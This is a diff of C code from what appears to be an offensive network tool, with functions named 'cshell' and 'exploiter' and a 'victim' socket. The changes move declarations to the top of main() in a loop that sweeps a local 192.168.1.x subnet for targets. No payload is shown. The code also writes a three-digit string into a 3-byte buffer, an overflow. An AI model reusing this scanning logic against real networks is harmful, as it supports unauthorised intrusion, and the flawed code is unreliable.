@@ -21,7 +21,6 @@
 #include <stdarg.h>
 #include <string.h>
 #include <time.h>
-// #include <ifaddrs.h>
 
 #include <poll.h>
 
@@ -30,7 +29,6 @@
 
 void cshell (int sock);
 int exploiter(int argc, char *argv[]);
-// char *showips();
 
 int main(int argc, char *argv[]) {
  
@@ -47,17 +45,21 @@ int main(int argc, char *argv[]) {
     struct hostent *server;
     struct sockaddr_in victim;
     struct pollfd fd;
-    int ret;
+    int i;
+    char *ip;
+    char *subnet;
+    char *token;
+    int ipaddr;
+    char *ips;
 
-    char *ip = malloc(IP_LENGTH*sizeof(char));
+    ip = malloc(IP_LENGTH*sizeof(char));
 
     // ip = showips();
     strcpy(ip, "192.168.1.110");
 
     // Isolate subnet from IP
-    int i = 0;
-    char *subnet = malloc(IP_LENGTH*sizeof(char));
-    char *token;
+    i = 0;
+    subnet = malloc(IP_LENGTH*sizeof(char));
     subnet[0] = '\0';
     while (((token = strsep(&ip, ".")) != NULL) && i<3 ) {        
         strcat(subnet, token);
@@ -66,8 +68,8 @@ int main(int argc, char *argv[]) {
     }
 
     ip = malloc(IP_LENGTH*sizeof(char));
-    char *ips = malloc(3*sizeof(char));
-    for (int ipaddr=110; ipaddr<=254; ipaddr++) {
+    ips = malloc(3*sizeof(char));
+    for (ipaddr=110; ipaddr<=254; ipaddr++) {
 
         strcpy(ip, subnet);
         sprintf(ips, "%d", ipaddr);
